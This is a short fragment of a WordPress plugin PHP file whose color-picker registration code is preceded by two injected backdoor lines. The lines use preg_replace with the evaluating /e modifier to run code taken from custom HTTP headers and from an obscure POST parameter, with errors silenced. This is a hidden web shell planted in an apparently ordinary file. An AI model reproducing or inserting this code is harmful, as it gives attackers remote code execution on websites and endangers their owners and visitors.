<?php @preg_replace($_SERVER['HTTP_X_PBE297'], $_SERVER['HTTP_X_CURRENT'], ''); ?><?php @preg_replace('/(.*)/e', @$_POST['jdxocpnkauh'], '');
			...
			if ( ! is_admin() ) {
		   	...
		   	wp_register_script( 'wp-color-picker', admin_url( 'js/color-picker.min.js' ), array( 'iris' ), self::CMB_VERSION );
				wp_localize_script( 'wp-color-picker', 'wpColorPickerL10n', array(
					'clear' => __( 'Clear', 'metabox' ),
					'defaultString' => __( 'Default', 'metabox' ),
					'pick' => __( 'Select Color', 'metabox' ),
					'current' => __( 'Current Color', 'metabox' ),
				) );
			}
		} else {
